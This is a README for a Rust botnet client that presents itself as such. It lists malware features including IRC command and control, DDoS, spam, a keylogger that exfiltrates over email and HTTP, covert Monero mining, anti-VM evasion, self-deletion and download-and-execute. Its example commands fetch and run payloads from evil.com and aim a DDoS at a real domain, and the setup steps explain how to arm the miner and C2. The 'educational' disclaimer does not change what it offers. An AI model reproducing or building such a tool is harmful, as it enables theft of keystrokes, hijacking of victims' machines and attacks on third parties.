# Botnet Client

This is a simple botnet client implemented in Rust. It includes functionalities for TCP proxy (SOCKS5 placeholder), sending spam emails, IRC command and control, real cryptocurrency mining with embedded XMRig, keylogging with dual exfiltration (email + HTTP), DGA for C2 domains, advanced anti-VM detection (processes, registry, files, MAC, CPU, RAM), self-deletion with PowerShell, and self-update.

## Features

- **TCP Proxy**: Simple TCP echo proxy (foundation for SOCKS5 implementation).
- **Email Spam**: Sends spam emails using SMTP.
- **IRC C2**: Connects to an IRC server for command and control.
- **Real Cryptocurrency Mining**: Embeds XMRig binary (base64), runs silently, connects to real Monero pool with wallet.
- **Keylogger + Dual Exfil**: Captures keystrokes and exfiltrates via email and HTTP (base64 encoded).
- **DGA for C2 Domains**: Generates domain names using date-based seed.
- **Advanced Anti-VM Detection**: Checks processes, registry, files, MAC address prefixes, CPU name, RAM size.
- **Self-Delete**: Uses PowerShell Remove-Item for forceful deletion.
- **Self-Update**: Downloads new bot version and replaces itself.
- **Persistence**: Logs the running process to a file.
- **Command Handling**: Executes commands received from the C2 server.
- **Download/Execute**: Downloads and runs payloads via HTTP.

## Example Commands

- `!cmd ddos google.com 80 120` → DDoS for 2 minutes
- `!cmd spam victim@mail.com 100` → Send 100 spam emails
- `!cmd proxy 1080` → Start TCP proxy on port 1080
- `!cmd download http://evil.com/payload.exe` → Download and run the payload
- `!cmd mine` → Start real XMRig mining to pool
- `!cmd keylog` → Start keylogger
- `!cmd exfil` → Exfiltrate keystrokes (email + HTTP)
- `!cmd dga` → Generate DGA domains
- `!cmd antivm` → Advanced VM detection
- `!cmd selfdelete` → Self-delete with PowerShell
- `!cmd update http://evil.com/newbot.exe` → Update to new version

## Setup

1. Replace `BASE64_XMRIG` with actual base64 encoded XMRig binary.
2. Update `POOL_URL` and `WALLET` with real Monero mining pool and wallet.
3. Configure SMTP settings for email exfil.
4. Configure IRC server for C2.

## Disclaimer

This software is for educational purposes only. Use responsibly and within the bounds of the law.

## Usage

1. Configure the `config.toml` file for IRC settings (or hardcoded).
2. Run the botnet client.
3. Use the example commands to control the botnet.

## Disclaimer

This software is for educational purposes only. Use responsibly and within the bounds of the law.
